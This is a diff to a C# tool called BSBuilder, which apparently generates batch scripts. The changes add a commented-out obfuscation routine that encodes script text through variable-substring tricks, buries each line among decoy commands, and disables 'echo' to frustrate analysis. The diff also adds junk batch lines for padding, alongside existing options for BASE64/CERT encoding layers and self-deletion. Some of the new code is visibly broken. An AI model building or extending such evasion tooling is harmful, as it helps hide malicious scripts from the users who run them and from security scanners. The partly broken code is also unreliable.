@@ -237,9 +237,51 @@ namespace BSBuilder
             batch = batch.Replace(original, newcurl);
         }
 
-        void obfuscatebatch(string batchsource, int pass)
+        void obfuscatebatch(string batchsource, string prefix, int pass)
         {
-            //Todo
+            /*
+            Random rand = new Random();
+
+            //Default charlist
+            string charlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+            //Randomize charlist
+            char[] chararray = charlist.ToCharArray().OrderBy(x => Guid.NewGuid()).ToArray();
+            
+            string[] secureCommand = { "dir %temp%", "ipconfig", "tree %windir%", "cls", "tree %appdata%" };
+            string set = prefix + rand.Next(1, 10).ToString();
+
+            string obfuscatedCode = "";
+            string[] secureCode = {};
+            object[] letterTab = {};
+
+            //Debug protection
+            secureCode.Append("DOSKEY echo=cls");
+            foreach (string item in batchsource.Replace("\\", "/").Split('\n')) 
+            {
+                int randomNum = rand.Next(1, 5);
+                secureCode.Append(string.Format("{0} > nul && {1} > nul && cls", secureCommand[randomNum], item));
+            }
+            secureCode = string.Concat(secureCode);
+
+            foreach (char i in chararray)
+            {
+                letterTab[i] = string.Format("%${0}:~${1},1%",set,i);
+            }
+
+            for (int i = 0; i < secureCode.Length; i++)
+            {
+                if (letterTab[secureCode[i]].ToString().Length != 0)
+                {
+                    obfuscatedCode += letterTab[secureCode[i]];
+                }
+                else
+                {
+                    obfuscatedCode += secureCode[i];
+                }
+            }
+
+            MessageBox.Show(obfuscatedCode);
+            */
         }
 
         public static string Base64Encode(string plainText)
@@ -247,11 +289,11 @@ namespace BSBuilder
             try
             {
                 var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
-                return System.Convert.ToBase64String(plainTextBytes);
-            }
+                return Convert.ToBase64String(plainTextBytes);
+            } 
             catch
             {
-                MessageBox.Show("You most likely added too many CERT layers and ran out of memory.\n\nTry again with less than 30 layers.","Memory error");
+                MessageBox.Show("You most likely added too many BASE64/CERT layers and ran out of memory.\n\nTry again with less than 30 layers.","Memory error");
                 return "Error";
             }
         }
@@ -276,7 +318,7 @@ namespace BSBuilder
                             "goto endoftests",
                             "   goto workdone",
                             "set F=%date%",
-                            ":: Fixed",
+                            "   :: Fixed",
                             "if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)",
                             "   if %user_agrees% do",
                             "set /p folder=fd:" +
@@ -288,9 +330,9 @@ namespace BSBuilder
                             "\n)",
                             "   set filepath=%%~fG",
                             "set filepath=%%~fG & set /p folder=f: & set F=%date% & for /f \"delims=[] tokens=2\" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| findstr [') do set d=%%a",
-                            "   set for /f \"delims=[] tokens=2\" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| findstr [') do set d=%%a & set F=%date%",
+                            "   set for /f \"delims=[] tokens=2\" %%a in ('2^>NUL b -4 -n 1 %cmptr%",
                             "ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1",
-                            "   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.) & IF %F%==1 do %C%==1",
+                            "   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)",
                             "timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %) else (set r = success, % then %, false.) &IF % F %== 2 do % C %== 4",
                             "   set C=cls",
                             "   set /A sample =1",
@@ -311,13 +353,49 @@ namespace BSBuilder
                             "setlocal",
                             "2>NUL Info > %tempsys%",
                             "   2>NUL Info > %tempsys%",
+                            "set \"input=%~1\"",
+                            "if \"!input:~0,1!\" equ \"-\"",
+                            "set \"input=!input:~1!\"",
+                            "if \"!input:~0,1!\" equ \"+\" set \"input = !input:~1!\"",
+                            "set result=false",
+                            "   set result=true",
+                            "set wait=true",
+                            "   set wait=false",
+                            "endlocal & if \"%~2\" neq \"\" (set %~2=%result%) else echo %result%",
+                            "   echo %~1 | find /i \"help\" >nul 2>&1 && ( goto :help )",
+                            "set \"verp=%%~O\"",
+                            "   rem Please wait",
+                            "echo %~n0 [RtnVar]",
+                            "   if \"%s%\" equ \"#%~1\" endlocal& if \"%~3\" neq \"\" (set %~3=-1&exit /b 0) else (echo -1&exit /b 0)",
+                            " set \"len=0\"",
+                            "set \"s=!s:~%% A!\"",
+                            "   set /a \"len+=%%A\"",
+                            "set /A mod=2*%%A",
+                            "   set /A mod=2*%%A",
+                            "::set \"th=%~1\"",
+                            "call ::insert %~1r %value%",
+                            "   rem exit /b 0",
+                            "echo <wait>",
+                            "set \"host=%~2\"",
+                            "   set \"record=%~2\"",
+                            "set \"commandline=%~2\"",
+                            "   goto :argParser",
+                            ":endArgParser",
+                            "set \"user_param=/USER:% user %\"",
+                            "   goto :eof",
+                            "echo Started",
+                            "   echo %%1=%1 N=%N%",
+                            "echo %%1=%1 %%2=%2 %%3=%3",
+                            "set \"[=rem/||(\" & set \"]=)\"",
+                            "set \"[:=goto :]%% \"",
                             "",
                             "",
                             "",
                             "",
                             "",
                             "",
-                            ""
+                            "",
+                            "",
                         };
 
             //To avoid two same commands being put in a row 
@@ -578,7 +656,7 @@ namespace BSBuilder
                     }
 
                     if (obfuscate)
-                        obfuscatebatch(batch, 1);
+                        obfuscatebatch(batch, "takaovi", 1);
 
                     if (recurring)
                     {
@@ -1090,6 +1168,11 @@ namespace BSBuilder
                 cert = true;
                 selfdelete = true;
                 selfdeletecheckbox.Checked = true;
+                if(startadmin)
+                {
+                    startadmin = false;
+                    startadmincheckbox.Checked = false;
+                }
             }
             else
             {
